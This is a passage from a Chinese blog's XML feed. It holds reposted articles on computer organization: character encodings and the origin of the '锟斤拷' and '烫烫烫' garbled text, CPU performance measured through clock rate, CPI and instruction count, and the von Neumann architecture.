Encoding）字符集</p><p>表示的可以是字符的一个集合</p><p>比如“中文”就是一个字符集，不过这样描述一个字符集并不准确</p><p>想要更精确一点，我们可以说，“第一版《新华字典》里面出现的所有汉字”，这是一个字符集。这样，我们才能明确知道，一个字符在不在这个集合里面</p><p>比如，我们日常说的Unicode，其实就是一个字符集，包含了150种语言的14万个不同的字符。</p><h3 id="2-3-字符编码"><a href="#2-3-字符编码" class="headerlink" title="2.3 字符编码"></a>2.3 字符编码</h3><p>字符编码是对于字符集里的这些字符，怎么一一用二进制表示出来的一个字典</p><p>我们上面说的Unicode，就可以用UTF-8、UTF-16，乃至UTF-32来进行编码，存储成二进制。所以，有了Unicode，其实我们可以用不止UTF-8一种编码形式，我们也可以自己发明一套 GT-32 编码，比如就叫作Geek Time 32好了。只要别人知道这套编码规则，就可以正常传输、显示这段代码。</p><p><img data-src="http://p1.pstatp.com/large/pgc-image/a5b54bb4bd9c4cca9e6c9cbadefff46d" alt="重学计算机组成原理（十）- &quot;烫烫烫&quot;乱码的由来"></p><p>同样的文本，采用不同的编码存储下来。如果另外一个程序，用一种不同的编码方式来进行解码和展示，就会出现乱码。这就好像两个军队用密语通信，如果用错了密码本，那看到的消息就会不知所云。在中文世界里，最典型的就是“手持两把锟斤拷，口中疾呼烫烫烫”的典故。</p><p>没有经验的同学，在看到程序输出“烫烫烫”的时候，以为是程序让CPU过热发出报警，于是尝试给CPU降频来解决问题。</p><p>既然今天要彻底搞清楚编码知识，我们就来弄清楚“锟斤拷”和“烫烫烫”的来龙去脉。</p><p><strong>“锟斤拷”的来源</strong></p><p>如果我们想要用Unicode编码记录一些文本，特别是一些遗留的老字符集内的文本，但是这些字符在Unicode中可能并不存在。于是，Unicode会统一把这些字符记录为U+FFFD这个编码</p><p>如果用UTF-8的格式存储下来，就是\\xef\\xbf\\xbd。如果连续两个这样的字符放在一起，\\xef\\xbf\\xbd\\xef\\xbf\\xbd，这个时候，如果程序把这个字符，用GB2312的方式进行decode，就会变成“锟斤拷”。这就好比我们用GB2312这本密码本，去解密别人用UTF-8加密的信息，自然没办法读出有用的信息。</p><p>而“烫烫烫”，则是因为如果你用了Visual Studio的调试器，默认使用MBCS字符集</p><p>“烫”在里面是由0xCCCC来表示的，而0xCC又恰好是未初始化的内存的赋值。于是，在读到没有赋值的内存地址或者变量的时候，电脑就开始大叫“烫烫烫”了。</p><h2 id="3-总结延伸"><a href="#3-总结延伸" class="headerlink" title="3 总结延伸"></a>3 总结延伸</h2><p>到这里，相信你发现，我们可以用二进制编码的方式，表示任意的信息。只要建立起字符集和字符编码，并且得到大家的认同，我们就可以在计算机里面表示这样的信息了。所以说，如果你有心，要发明一门自己的克林贡语并不是什么难事。</p><p>不过，光是明白怎么把数值和字符在逻辑层面用二进制表示是不够的。我们在计算机组成里面，关心的不只是数值和字符的逻辑表示，更要弄明白，在硬件层面，这些数值和我们一直提的晶体管和电路有什么关系。下一讲，我就会为你揭开神秘的面纱。我会从时钟和D触发器讲起，最终让你明白，计算机里的加法，是如何通过电路来实现的。</p><h2 id="4-推荐阅读"><a href="#4-推荐阅读" class="headerlink" title="4 推荐阅读"></a>4 推荐阅读</h2><ul><li>《编码：隐匿在计算机软硬件背后的语言》</li></ul><p><img data-src="https://ae01.alicdn.com/kf/H22d1ad2b6ba64ca88662a1b9326e9cben.jpg"></p><ul><li>从电报机到计算机，这本书讲述了很多计算设备的历史故事，当然，也包含了二进制及其背后对应的电路原理。</li></ul><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul><li>深入浅出计算机组成原理</li></ul>]]></content>
      
      
      <categories>
          
          <category> 知识理论 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 计算机组成原理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>转载-计算机组成原理-如何判定及提高计算机性能？</title>
      <link href="/archives/e8ba13ef.html"/>
      <url>/archives/e8ba13ef.html</url>
      
        <content type="html"><![CDATA[<h2 id="0-前言"><a href="#0-前言" class="headerlink" title="0. 前言"></a>0. 前言</h2><p>非科班出身，特此来补计算机基础知识。</p><p>本文为转载文章，原文地址：<span class="exturl" data-url="aHR0cHM6Ly93d3cudG91dGlhby5jb20vaTY3MjM0OTk5Njc3Mjc1MzQ2MDQv" title="https://www.toutiao.com/i6723499967727534604/">https://www.toutiao.com/i6723499967727534604/<i class="fa fa-external-link"></i></span></p><a id="more"></a><p><strong>本文引言：</strong></p><ul><li>买电脑时，“原来的电脑性能跟不上啦”</li><li>写程序时，“这个程序性能可以优化一下”</li></ul><p>这虚无缥缈的“性能”到底指的是什么呢？</p><p>我们能不能给性能下一个明确的定义，然后来进行准确的比较呢？</p><p>在计算机组成原理乃至体系结构中，“性能”都是最重要的一个主题。</p><p>学习和研究计算机组成原理，就是在理解计算机是怎么运作的，以及为什么要这么运作。</p><p>“为什么”所要解决的事情，很多时候就是提升“性能”。</p><h2 id="1-时间的倒数-性能"><a href="#1-时间的倒数-性能" class="headerlink" title="1 时间的倒数 - 性能"></a>1 时间的倒数 - 性能</h2><p>计算机的性能，其实和体力劳动很像，好比是我们要搬东西。</p><p>对于计算机的性能，我们需要有个标准来衡量。这个标准中主要有两个指标。</p><ul><li><strong>响应时间（Response time）&amp; 执行时间（Execution time）</strong></li></ul><p>让计算机<strong>“跑得更快”</strong>。我们执行一个程序，到底需要花多少时间。花的时间越少，自然性能就越好。</p><ul><li><strong>吞吐率（Throughput）&amp; 带宽（Bandwidth）</strong></li></ul><p>让计算机<strong>“搬得更多”</strong>。服务器使用的网络带宽，通常就是一个吞吐率性能指标.吞吐率是指我们在一定的时间范围内，到底能处理多少事情。这里的“事情”，在计算机里就是处理的数据或者执行的程序指令。</p><p>和搬东西对比，如果响应时间短，跑得快，我们可以来回多跑几趟搬几趟。</p><p>所以<strong>缩短程序的响应时间，一般来说都会提升吞吐率</strong>。</p><p>除了缩短响应时间，我们还有别的方法吗？当然！</p><p>我们还可以多找几个人一起来搬，这就类似服务器都是多核的。</p><p>人多力量大，同时处理数据，在单位时间内就可以处理更多数据，吞吐率自然也就上去了。</p><p>提升吞吐率的办法有很多。大部分时候，我们只要多加一些机器，<strong>多堆一些硬件</strong>就好了。</p><hr><p>但是<strong>响应时间的提升却没有那么容易</strong>，因为CPU的性能提升其实在10年前就处于“挤牙膏”的状态了，所以我们得慎重地来分析对待。</p><p>下面我们具体来看。</p><p><strong>我们一般把性能，定义成响应时间的倒数</strong>，也就是：<br>$$<br>性能 = 1/响应时间<br>$$<br>响应时间越短，性能数值越高。</p><p>同样一个程序</p><ul><li>在Intel最新的CPU Coffee Lake上，只需要30s就能运行完成</li><li>而在5年前CPU Sandy Bridge上，需要1min才能完成</li></ul><p>那么我们自然可以算出来，Coffee Lake的性能是1/30，Sandy Bridge的性能是1/60，两个的性能比为2。于是，我们就可以说，Coffee Lake的性能是Sandy Bridge的2倍。</p><p>过去几年流行的手机跑分软件，就是把多个预设好的程序在手机上运行，然后根据运行需要的时间，算出一个分数来给出手机的性能评估。</p><h2 id="2-计算机的计时单位：CPU时钟"><a href="#2-计算机的计时单位：CPU时钟" class="headerlink" title="2 计算机的计时单位：CPU时钟"></a>2 计算机的计时单位：CPU时钟</h2><p>虽然时间是一个很自然的用来衡量性能的指标，但是用时间来衡量时，有两个问题。</p><h3 id="2-1-时间的测不准原理"><a href="#2-1-时间的测不准原理" class="headerlink" title="2.1 时间的测不准原理"></a>2.1 时间的测不准原理</h3><p>如果用你自己随便写的一个程序，来统计程序运行的时间，每一次统计结果不会完全一样。</p><p>为什么会不准呢？这里面有好几个原因。</p><h4 id="2-1-1-统计时间方法"><a href="#2-1-1-统计时间方法" class="headerlink" title="2.1.1 统计时间方法"></a>2.1.1 统计时间方法</h4><p>我们统计时间是用类似于“掐秒表”一样，记录 程序运行结束时间减去程序开始运行的时间。</p><p>这个时间也叫Wall Clock Time或者Elapsed Time</p><p>就是在运行程序期间，挂在墙上的钟走掉的时间。</p><p>但计算机可能同时运行着好多个程序，CPU实际上不停地在各个程序之间进行切换。</p><p>在这些走掉的时间里，很可能CPU切换去运行别的程序了。</p><p>而且，有些程序在运行的时候，可能要从网络、硬盘去读取数据，要等网络和硬盘把数据读出来，给到内存和CPU。</p><p><strong>要想准确统计某程序的实际运行时间，进而比较程序之间的性能，须把这些额外时间除掉</strong></p><p>那这件事怎么实现呢？？？</p><p>i&gt; Linux下有一个叫<code>time</code>的命令，可助我们一臂之力，同样的Wall Clock Time下，程序实际在CPU上到底花了多少时间。</p><p>我们简单运行一下time命令。它会返回三个值</p><ul><li>第一个 <strong>real time</strong></li><li>也就是我们说的Wall Clock Time，即运行程序整个过程中流逝掉的时间</li><li>第二个 <strong>user time</strong></li><li>CPU在运行你的程序，在用户态运行指令的时间</li><li>第三个<strong>sys time</strong></li><li>CPU运行你的程序，在操作系统内核里运行指令的时间</li></ul><p><strong>程序实际花费的CPU执行时间（CPU Time），就是user time加上sys time</strong></p><p><img data-src="http://p1.pstatp.com/large/pgc-image/e54ca1bdabad4a9e9551688980087f94"></p><p>一般情况下，如果user+sys比real大，甚至仅user比real大的情况出现，都是因为对应的程序被多个进程或者多个线程并行执行了，也很常见。</p><blockquote><p>在多核或者多cpu的机器上运行，seq和wc命令会分配到两个cpu上，<em>user和sys是两个cpu时间相加的，而real只是现实时钟里走过的时间，<strong>极端情况下user+sys可以到达real的两倍</strong></em></p></blockquote><p>虽然seq和wc这两个命令都是单线程运行的，但是这两个命令在多核cpu运行的情况下，会分别分配到两个不同的cpu，于<em>是user和sys的时间都是两个cpu上运行的时间之和</em>，就可能超过real的时间。</p><p>可以这样来快速验证，运行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">time seq 100000000 | wc -l &amp;</span><br></pre></td></tr></table></figure><p>让这个命令多跑一会儿，并且在后台运行。</p><p>然后利用 top 命令看不同进程的cpu占用情况</p><p>你会在top的前几行里看到seq和wc的cpu占用都接近100，实际是各被分配到了一个不同的cpu执行。</p><h4 id="2-1-2-不一定可直接比较出性能"><a href="#2-1-2-不一定可直接比较出性能" class="headerlink" title="2.1.2 不一定可直接比较出性能"></a>2.1.2 不一定可直接比较出性能</h4><p>即使我们已经拿到了CPU时间，我们也不一定可以直接“比较”出两个程序的性能差异</p><p>即使在同一台计算机上，CPU可能满载运行也可能降频运行，降频运行的时候自然花的时间会多一些。</p><p>除CPU外，时间这个性能指标还会受到主板、内存这些其他相关硬件的影响。</p><p>所以，我们需要对“时间”这个概念进行拆解。</p><h3 id="2-2-CPU时间拆解"><a href="#2-2-CPU时间拆解" class="headerlink" title="2.2 CPU时间拆解"></a>2.2 CPU时间拆解</h3><p>先给出总公式：<br>$$<br>CPU执行时间=CPU时钟周期数×每个时钟周期的时间<br>$$</p><h4 id="2-2-1-时钟周期时间"><a href="#2-2-1-时钟周期时间" class="headerlink" title="2.2.1 时钟周期时间"></a>2.2.1 时钟周期时间</h4><p>你在买电脑的时候，一定关注过CPU的主频</p><p>如：</p><p><img data-src="http://p3.pstatp.com/large/pgc-image/9a17c120f66f46a084804fffaa4c3fb2"></p><p>这里的2.8GHz就是电脑的主频（Frequency/Clock Rate）。</p><p>这个2.8GHz，我们可以先简单地理解为，CPU在1秒时间内，可以执行的简单指令的数量是2.8G条。</p><p>更准确点，<strong>这个2.8GHz就代表，我们CPU的一个“钟表”能够识别出来的最小的时间间隔</strong>。</p><p>i&gt; 时钟周期时间就是指CPU所能识别出来的最小时间间隔。</p><p>就像我们挂在墙上的挂钟，都是一秒一秒地走，所以通过墙上的挂钟能够识别出来的最小时间单位就是秒。</p><p>而在CPU内部，有一个叫晶体振荡器（Oscillator Crystal）的东西，简称为晶振。</p><p>把晶振当成CPU内部的电子表来使用。</p><p>晶振带来的每一次“滴答”，就是时钟周期时间。</p><p>在我这个2.8GHz的CPU上，这个时钟周期时间，就是1/2.8G。</p><p>我们的CPU，是按照这个“时钟”提示的时间来进行自己的操作。</p><p><strong>主频越高，意味着这个表走得越快，我们的CPU也就走得越快。</strong></p><p>“超频”，这说的其实就相当于把买回来的CPU内部的钟给调快了，于是CPU的计算跟着这个时钟的节奏，也就自然变快了。当然这个快不是没有代价的，CPU跑得越快，散热的压力也就越大。就和人一样，超过生理极限，CPU就会崩溃了。</p><ul><li>回顾之前的CPU执行时间的公式程序:<br>$$<br>CPU执行时间=CPU时钟周期数×每个时钟周期的时间<br>$$</li></ul><p>我们当然是想CPU执行时间越短越好，所以最简单的提升性能方案，自然是缩短时钟周期时间，也就是提升主频。</p><p>换句话说，就是换一块好一点的CPU。</p><h4 id="2-2-2-CPU时钟周期数"><a href="#2-2-2-CPU时钟周期数" class="headerlink" title="2.2.2 CPU时钟周期数"></a>2.2.2 CPU时钟周期数</h4><p>主频，这个是我们这些底层的研发人员控制不了的，所以我们就把目光挪到了乘法的另一个因子——<strong>CPU时钟周期数上</strong>。</p><p>i&gt; CPU时钟周期数量指的是运行单个程序的所有指令总共所需要的时钟周期数量。</p><p>如果能够减少程序需要的CPU时钟周期数量，一样能够提升程序性能。对于CPU时钟周期数，我们可以再做一个分解，把它变成<br>$$<br>CPU时钟周期数 = 程序中的总指令数×每条指令的平均时钟周期数（Cycles Per Instruction，简称CPI）<br>$$<br>不同的指令需要的Cycles是不同的，如：</p><ul><li><p>加法和乘法都对应着一条CPU指令</p></li><li><h4 id="但是乘法需要的Cycles就比加法要多，自然也就慢。"><a href="#但是乘法需要的Cycles就比加法要多，自然也就慢。" class="headerlink" title="但是乘法需要的Cycles就比加法要多，自然也就慢。"></a>但是乘法需要的Cycles就比加法要多，自然也就慢。</h4></li></ul><h4 id="2-2-3-最终结果"><a href="#2-2-3-最终结果" class="headerlink" title="2.2.3 最终结果"></a>2.2.3 最终结果</h4><p>在这样拆分了之后，我们的程序的CPU执行时间就可以变成这样三个部分的乘积。</p><p>$$<br>程序的CPU执行时间=程序总指令数 × CPI × 时钟周期时间<br>$$</p><p>因此，<strong>要解决性能问题，就是要优化这三者</strong>。</p><ul><li><p>指令数，代表执行我们的程序到底需要多少条指令、用哪些指令，这个很多时候就把挑战交给了编译器。同样的代码，编译成计算机指令时候，就有各种不同的表示方式。</p></li><li><p>每条指令的平均时钟周期数CPI。一条指令到底需要多少CPU Cycle。在后面讲解CPU结构的时候，我们会看到，现代的CPU通过流水线技术（Pipeline），让一条指令需要的CPU Cycle尽可能地少。因此，对于CPI的优化，也是计算机组成和体系结构中的重要一环。</p></li><li><p>时钟周期时间，就是计算机主频，取决于硬件。最早的80386主频只有33MHz，现在手头的笔记本电脑就有2.8GHz，在主频层面，就提升了将近100倍。</p></li></ul><h4 id="2-2-4-打个比方"><a href="#2-2-4-打个比方" class="headerlink" title="2.2.4 打个比方"></a>2.2.4 打个比方</h4><p>把自己想象成一个CPU，坐在那里写程序。</p><ul><li><p>计算机主频就好像是你的打字速度，打字越快，你自然可以多写一点程序。</p></li><li><p>CPI相当于你在写程序的时候，熟悉各种快捷键，越是打同样的内容，需要敲击键盘的次数就越少。</p></li><li><p>指令数相当于你的程序设计得够合理，同样的程序要写的代码行数就少。</p></li></ul><p>如果三者皆能实现，你自然可以很快地写出一个优秀的程序，“性能”从外面来看就是好的。</p><h4 id="2-2-5-额外知识补充"><a href="#2-2-5-额外知识补充" class="headerlink" title="2.2.5 额外知识补充"></a>2.2.5 额外知识补充</h4><p>1.时钟周期、机器周期、指令周期的区别？</p><p>一个指令周期包含多个机器周期，一个机器周期又包含多个时钟周期。</p><p><img data-src="https://ae01.alicdn.com/kf/Hfd41636ec376457893dbc77f8ffc740ao.png"></p><h2 id="3-总结"><a href="#3-总结" class="headerlink" title="3 总结"></a>3 总结</h2><p>学完本文，对“性能”这个名词，你应该有了更清晰的认识。</p><p>主要对于“响应时间”这个性能指标进行抽丝剥茧，拆解成了计算机时钟周期、CPI以及指令数这三个独立的指标的乘积，并且为指明了优化计算机性能的三条康庄大道。</p><p>也就是，提升计算机主频，优化CPU设计使得在单个时钟周期内能够执行更多指令，以及通过编译器来减少需要的指令数。</p><p>后面会讲解，具体怎么在电路硬件、CPU设计，乃至指令设计层面，提升计算机的性能。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li>豆瓣读书 - 计算机专题</li><li>深入浅出计算机组成原理</li><li><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3UwMTIwNzY2NjkvYXJ0aWNsZS9kZXRhaWxzLzg0NDUyMjY0" title="https://blog.csdn.net/u012076669/article/details/84452264">如何理解时钟周期及公式CPU执行时间 = CPU时钟周期数/主频<i class="fa fa-external-link"></i></span></li><li><span class="exturl" data-url="aHR0cHM6Ly9zdGFja292ZXJmbG93LmNvbS9xdWVzdGlvbnMvNTU2NDA1L3doYXQtZG8tcmVhbC11c2VyLWFuZC1zeXMtbWVhbi1pbi10aGUtb3V0cHV0LW9mLXRpbWUx" title="https://stackoverflow.com/questions/556405/what-do-real-user-and-sys-mean-in-the-output-of-time1">https://stackoverflow.com/questions/556405/what-do-real-user-and-sys-mean-in-the-output-of-time1<i class="fa fa-external-link"></i></span></li></ul>]]></content>
      
      
      <categories>
          
          <category> 知识理论 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 计算机组成原理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>转载-计算机组成原理-冯·诺依曼体系结构</title>
      <link href="/archives/ea4e9caa.html"/>
      <url>/archives/ea4e9caa.html</url>
      
        <content type="html"><![CDATA[<h2 id="0-前言"><a href="#0-前言" class="headerlink" title="0. 前言"></a>0. 前言</h2><p>非科班出身，特此来补计算机基础知识。</p><p>本文为转载文章，原文地址：<span class="exturl" data-url="aHR0cHM6Ly93d3cudG91dGlhby5jb20vaTY3MjI4NTkwNjEyMTk0MjY4Mjkv" title="https://www.toutiao.com/i6722859061219426829/">https://www.toutiao.com/i6722859061219426829/<i class="fa fa-external-link"></i></span></p><a id="more"></a><h2 id="1-计算机的基本硬件组成"><a href="#1-计算机的基本硬件组成" class="headerlink" title="1 计算机的基本硬件组成"></a>1 计算机的基本硬件组成</h2><p>早期,DIY一台计算机，要先有三大件</p><ul><li>CPU</li><li>内存</li><li>主板</li></ul><h3 id="1-1-CPU"><a href="#1-1-CPU" class="headerlink" title="1.1 CPU"></a>1.1 CPU</h3><p>计算机最重要的核心配件，中央处理器（Central Processing Unit）。</p><p>计算机的所有“计算”都是由CPU来进行的。</p><ul><li>CPU是一个超级精细的印刷电路版</li></ul><p><img data-src="http://p3.pstatp.com/large/pgc-image/0d89745520ae4ebeb5b497318c733002" alt="重学计算机组成原理（一）- 冯·诺依曼体系结构"></p><h3 id="1-2-内存（Memory）"><a href="#1-2-内存（Memory）" class="headerlink" title="1.2 内存（Memory）"></a>1.2 内存（Memory）</h3><p>你撰写的程序、打开的浏览器、运行的游戏，都要加载到内存里才能运行。</p><p>程序读取的数据、计算得到的结果，也都要放在内存里。内存越大，能加载的东西自然也就越多。</p><p>内存通常直接可以插在主板上，存放在内存里的程序和数据，需要被CPU读取，CPU计算完之后，还要把数据写回到内存。然而CPU不能直接插到内存上，反之亦然。于是，就带来了最后一个大件——主板（Motherboard）。</p><ul><li>内存通常直接可以插在主板上</li></ul><p><img data-src="http://p9.pstatp.com/large/pgc-image/3d95d46c9031489aab225e755bc96a26" alt="重学计算机组成原理（一）- 冯·诺依曼体系结构"></p><h3 id="1-3-主板"><a href="#1-3-主板" class="headerlink" title="1.3 主板"></a>1.3 主板</h3><p>主板是一个有着各种各样，有时候多达数十乃至上百个插槽的配件。</p><p>我们的CPU要插在主板上，内存也要插在主板上。</p><p>主板的芯片组（Chipset）和总线（Bus）解决了CPU和内存之间如何通信的问题。</p><ul><li><strong>芯片组控制了数据传输的流转</strong>，也就是数据从哪里到哪里的问题</li><li>总线则是实际数据传输的高速公路。总线速度（Bus Speed）决定了数据能传输得多快。</li></ul><p>计算机主板上通常有着各种各样的插槽</p><p>有了三大件，只要配上<strong>电源</strong>供电，计算机差不多就可以跑起来了。</p><p>但是现在还缺少各类输入（Input）/输出（Output）设备，也就是我们常说的<strong>I/O设备</strong>。</p><p>如果你用的是自己的个人电脑，那显示器肯定必不可少，只有有了显示器我们才能看到计算机输出的各种图像、文字，这也就是所谓的<strong>输出设备</strong>。</p><p>同样的，鼠标和键盘也都是必不可少的配件。这样我才能输入文本，写下这篇文章。它们也就是所谓的<strong>输入设备</strong>。</p><p>最后，你自己配的个人计算机，还要配上一个硬盘。这样各种数据才能持久地保存下来。</p><p>绝大部分人都会给自己的机器装上一个机箱，配上风扇，解决灰尘和散热的问题。</p><p>不过机箱和风扇，算不上是计算机的必备硬件，我们拿个纸板或者外面放个电风扇，也一样能用。</p><p>显示器、鼠标、键盘和硬盘这些东西并不是一台计算机必须的部分。</p><p>其实只需要有I/O设备，能让我们从计算机里输入和输出信息就可以了。</p><p><em>很多网吧的计算机就没有硬盘，而是直接通过局域网，读写远程网络硬盘里面的数据。</em></p><p>各类云服务器，只要让计算机能通过网络，SSH远程登陆访问就好了，因此也没必要配显示器、鼠标、键盘这些东西。</p><p>这样不仅能够节约成本，还更方便维护。</p><p>还有一个很特殊的设备，就是<strong>显卡</strong>（Graphics Card）。</p><p>现在，使用图形界面操作系统的计算机，无论是Windows、Mac OS还是Linux，显卡都是必不可少的。</p><p>有人可能要说了，我装机的时候没有买显卡，计算机一样可以正常跑起来啊！那是因为，现在的主板都带了内置的显卡。</p><p>如果你用计算机玩游戏，做图形渲染或者跑深度学习应用，你多半就需要买一张单独的显卡，插在主板上。</p><p>显卡之所以特殊，是因为显卡里有除了CPU之外的另一个“处理器”，也就是GPU（Graphics Processing Unit，图形处理器），GPU一样可以做各种“计算”的工作。</p><p>鼠标、键盘以及硬盘都是插在主板上的。作为外部I/O设备，它们是通过主板上的<strong>南桥</strong>（SouthBridge）芯片组，来控制和CPU之间的通信的。</p><p>“南桥”芯片的名字很直观</p><ul><li>它在主板上的位置，通常在主板的“南面”</li><li>它的作用就是作为“桥”，来<strong>连接鼠标、键盘以及硬盘这些外部设备和CPU之间的通信</strong>。</li></ul><p>有了南桥，自然对应着也有<strong>“北桥</strong>”。</p><p>是的，以前的主板上通常也有“北桥”芯片，用来作为“桥”，连接<strong>CPU和内存、显卡之间的通信</strong>。</p><p>不过，随着时间的变迁，现在的主板上的“北桥”芯片的工作，已经被移到了CPU的内部，所以你在主板上，已经看不到北桥芯片了。</p><h2 id="2-冯·诺依曼体系结构"><a href="#2-冯·诺依曼体系结构" class="headerlink" title="2 冯·诺依曼体系结构"></a>2 冯·诺依曼体系结构</h2><p>刚才我们讲了一台计算机的硬件组成，这说的是我们平时用的个人电脑或者服务器。那我们平时最常用的智能手机的组成，也是这样吗？</p><p>我们手机里只有SD卡（Secure Digital Memory Card）类似硬盘功能的存储卡插槽，并没有内存插槽、CPU插槽这些东西。</p><p>没错，因为手机尺寸的原因，手机制造商们选择把</p><p>CPU、内存、网络通信，乃至摄像头芯片，都封装到一个芯片，然后再嵌入到手机主板上。</p><p>这种方式叫<strong>SoC</strong>，也就是System on a Chip（系统芯片）。</p><p>看起来，个人电脑和智能手机的硬件组成方式不太一样。</p><p>可是，我们写智能手机上的App，和写个人电脑的客户端应用似乎没有什么差别，都是通过“高级语言”这样的编程语言撰写、编译之后，一样是把代码和数据加载到内存里来执行。</p><p>无论是个人电脑/服务器/智能手机，还是Raspberry Pi这样的微型卡片机，都遵循着同一个“计算机”的抽象概念。</p><p>这是怎么样一个“计算机”呢？这其实就是，计算机鼻祖冯·诺依曼提出的<strong>冯·诺依曼体系结构</strong>（Von Neumann architecture），也叫<strong>存储程序计算机</strong>。</p><p>什么是存储程序计算机呢？这里面其实暗含了两个概念</p><ul><li>“可编程”计算机</li><li>“存储”计算机</li></ul><p><strong>什么是“不可编程”？？？</strong></p><p>计算机是由各种门电路组合而成的，然后通过组装出一个固定的电路版，完成一个特定的计算程序。</p><p>一旦需要修改功能，就要重新组装电路。这样的话，计算机就是“不可编程”的，因为程序在计算机硬件层面是“写死”的。</p><p>最常见的就是老式计算器，电路板设好了加减乘除，做不了任何计算逻辑固定之外的事情。</p><p>计算器的本质是一个不可编程的计算机</p><p><img data-src="http://p3.pstatp.com/large/pgc-image/6fa81d1553b54857b6d1e59177575561" alt="重学计算机组成原理（一）- 冯·诺依曼体系结构"></p><p><strong>我们再来看“存储”计算机。</strong></p><p>程序本身是存储在计算机的内存里，可以通过加载不同的程序来解决不同的问题。</p><p><strong>有“存储程序计算机”，自然也有不能存储程序的计算机。</strong></p><p>典型的就是早年的“Plugboard”这样的插线板式的计算机。整个计算机就是一个巨大的插线板，通过在板子上不同的插头或者接口的位置插入线路，来实现不同的功能。这样的计算机自然是“可编程”的，但是编写好的程序不能存储下来供下一次加载使用，不得不每次要用到和当前不同的“程序”的时候，重新插板子，重新“编程”。</p><ul><li>著名的Engima Machine就用到了Plugboard来进行“编程”</li></ul><p><img data-src="http://p1.pstatp.com/large/pgc-image/7f5399f46504490bb3c97ae1cc9e81d4" alt="重学计算机组成原理（一）- 冯·诺依曼体系结构"></p><ul><li>可以看到，无论是“不可编程”还是“不可存储”，都会让使用计算机的效率大大下降。</li><li>而这个对于效率的追求，也就是“存储程序计算机”的由来。</li></ul><p>冯，基于当时在秘密开发的EDVAC写了一篇报告First Draft of a Report on the EDVAC，描述了他心目中的一台计算机应该长什么样。这篇报告在历史上有个很特殊的简称，叫First Draft。这样，现<strong>代计算机的发展就从祖师爷写的一份草案开始了。</strong></p><p>First Draft里面说了一台<strong>计算机应该有哪些部分组成</strong></p><p>首先是一个包含</p><ul><li>算术逻辑单元（Arithmetic Logic Unit，ALU）</li><li>处理器寄存器（Processor Register）</li></ul><p>的<strong>处理器单元</strong>（Processing Unit），用来完成各种算术和逻辑运算。</p><p>因为它能够完成各种数据的处理或者计算工作，因此也有人把这个叫作数据通路（Datapath）或者运算器。</p><p>然后是一个包含</p><ul><li>指令寄存器（Instruction Reigster）</li><li>程序计数器（Program Counter）</li></ul><p>的<strong>控制器单元</strong>（Control Unit/CU），用来控制程序的流程，通常就是不同条件下的分支和跳转。</p><p>在现在的计算机里，上面的算术逻辑单元和这里的控制器单元，共同组成了我们说的CPU。</p><p>接着是用来存储数据（Data）和指令（Instruction）的<strong>内存</strong>。以及更大容量的<strong>外部存储</strong>，在过去，可能是磁带、磁鼓这样的设备，现在通常就是硬盘。</p><p>最后就是各种<strong>输入和输出设备</strong>，以及对应的输入和输出机制。</p><p>我们现在无论是使用什么样的计算机，其实都是和输入输出设备在打交道。</p><ul><li>个人电脑的鼠标键盘是输入设备，显示器是输出设备</li><li>我们用的智能手机，触摸屏既是输入设备，又是输出设备</li><li>跑在各种云上的服务器，则是通过网络来进行输入和输出。这个时候，网卡既是输入设备又是输出设备</li></ul><blockquote><p>任何一台计算机的任何一个部件都可以归到运算器、控制器、存储器、输入设备和输出设备中，而所有的现代计算机也都是基于这个基础架构来设计开发的</p></blockquote><p>x&gt; 而所有的计算机程序，也都可以抽象为从<strong>输入设备</strong>读取输入信息，通过<strong>运算器</strong>和<strong>控制器</strong>来执行存储在<strong>存储器</strong>里的程序，最终把结果输出到<strong>输出设备</strong>中。而我们所有撰写的无论高级还是低级语言的程序，也都是基于这样一个抽象框架来进行运作的。</p><ul><li>冯·诺依曼体系结构示意图</li></ul><p><img data-src="http://p1.pstatp.com/large/pgc-image/44aa22d5e4d049fe8490c9641c04085d" alt="重学计算机组成原理（一）- 冯·诺依曼体系结构"></p><h2 id="3-总结"><a href="#3-总结" class="headerlink" title="3 总结"></a>3 总结</h2><p>冯·诺依曼体系结构确立了我们现在每天使用的计算机硬件的基础架构。</p><p>因此，学习计算机组成原理，其实就是学习和拆解冯·诺依曼体系结构。</p><p>具体来说，其实就是</p><ul><li>学习控制器、运算器的工作原理，也就是CPU是怎么工作的，以及为何这样设计</li><li>学习内存的工作原理，从最基本的电路，到上层抽象给到CPU乃至应用程序的接口是怎样的</li><li>学习CPU是怎么和输入设备、输出设备打交道的。</li></ul><p>学习组成原理，就是在理解从控制器、运算器、存储器、输入设备以及输出设备，从电路这样的硬件，到最终开放给软件的接口，是怎么运作的，为什么要设计成这样，以及在软件开发层面怎么尽可能用好它。</p><h2 id="4-推荐阅读"><a href="#4-推荐阅读" class="headerlink" title="4 推荐阅读"></a>4 推荐阅读</h2><ul><li>First Draft of a Report on the EDVAC</li><li>对于工程师来说，直接读取英文论文的原文，既可以搞清楚、弄明白对应的设计及其背后的思路来源，还可以帮你破除对于论文或者核心技术的恐惧心理。</li></ul><h2 id="5-思考"><a href="#5-思考" class="headerlink" title="5 思考"></a>5 思考</h2><p>计算机行业的两大祖师爷之一，除了冯·诺依曼机之外，还有一位就是著名的图灵（Alan Mathison Turing）。对应的，我们现在的计算机也叫图灵机（Turing Machine）。那么图灵机和冯·诺依曼机是两种不同的计算机么？图灵机是一种什么样的计算机抽象呢？</p><p>欢迎留言分享你的思考和疑惑，也可以把本文分享给你的朋友，一起学习和进步！</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li>深入浅出计算机组成原理</li></ul>]]></content>
      
      
      <categories>
          
          <category> 知识理论 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 计算机组成原理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>错误记录-ubuntu上网易云音乐无网络问题</title>
      <link href="/archives/47cfe70b.html"/>
      <url>/archives/47cfe70b.html</url>
      
